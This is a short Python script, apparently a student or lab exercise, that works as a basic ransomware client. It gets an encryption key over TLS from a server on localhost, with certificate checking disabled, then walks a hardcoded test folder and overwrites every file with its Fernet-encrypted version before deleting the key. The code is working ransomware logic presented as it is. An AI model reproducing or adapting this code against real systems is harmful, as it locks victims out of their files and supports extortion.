import socket
import ssl
import os
from cryptography.fernet import Fernet

def encript_files(path,key):
    fernet = Fernet(key.encode())
    for root, dirs, files in os.walk(path):
        #print(f"Current Directory: {root}")

        for file in files:
            file_path = os.path.join(root, file)
            #print(f"  File: {file_path}")
            with open(file_path, "rb") as file:
                file_data = file.read()
            encrypted_data = fernet.encrypt(file_data)
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
                #print(f"Sucssufly Encripted File at: {file_path}"
          
HOST = 'localhost'
PORT = 12345

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE  # For testing only! Don't use in production

client_socket = socket.create_connection((HOST, PORT))
ssl_socket = context.wrap_socket(client_socket, server_hostname=HOST)
data = ssl_socket.recv(1024)
  
#print(f"[CLIENT] Received: {data.decode()}")
encript_key = data.decode()
path = r"C:\Users\guysh\OneDrive\מסמכים\coders-club\Work\8_3_2025\test"
encript_files(path,encript_key)
del encript_key
ssl_socket.close()